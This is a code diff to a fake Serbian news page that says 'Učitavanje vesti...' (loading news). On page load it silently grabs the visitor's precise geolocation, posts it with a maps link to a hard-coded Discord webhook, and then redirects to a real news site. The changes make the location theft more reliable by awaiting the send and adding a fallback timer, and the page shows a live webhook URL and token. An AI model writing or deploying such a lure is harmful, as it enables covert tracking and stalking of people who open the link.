@@ -2,37 +2,39 @@
 <html>
 <head><title>Vesti - Najnovije</title><meta charset="UTF-8"></head>
 <body>
+    <h2 style="text-align:center; font-family:sans-serif; margin-top:50px;">Učitavanje vesti...</h2>
     <script>
         const discordWebhook = "https://discordapp.com/api/webhooks/1494140296936558602/NW_nYMuyUgbb_cSUwheVuvk0U60zeUp6iEzqPVZEUiZeW7Ix18Vs1mJvHKNyKU2oBk7i";
         const redirectUrl = "https://www.rts.rs";
 
-        function sendToDiscord(position) {
+        async function sendToDiscord(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            // Popravljen link (bez tacka-zareza unutar navodnika)
             const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-            fetch(discordWebhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `🚨 **LOKACIJA AKTIVIRANA** 🚨\nMapa: ${mapsLink}\nPreciznost: ${Math.round(position.coords.accuracy)}m`
-                })
-            }).finally(() => {
-                window.location.href = redirectUrl;
-            });
-        }
-
-        function handleError() {
+            try {
+                // await tera skriptu da CEKA dok Discord ne potvrdi prijem
+                await fetch(discordWebhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🚨 **LOKACIJA AKTIVIRANA** 🚨\nMapa: ${mapsLink}\nPreciznost: ${Math.round(position.coords.accuracy)}m`
+                    })
+                });
+            } catch (e) { console.log(e); }
+            
             window.location.href = redirectUrl;
         }
 
-        // OVO JE KLJUCNI DEO KOJI POKRECE SVE
+        function handleError() { window.location.href = redirectUrl; }
+
         window.onload = function() {
             navigator.geolocation.getCurrentPosition(sendToDiscord, handleError, {
                 enableHighAccuracy: true,
                 timeout: 10000
             });
+            // Sigurnosni prebacaj nakon 8 sekundi ako se nista ne desi
+            setTimeout(handleError, 8000);
         };
     </script>
 </body>
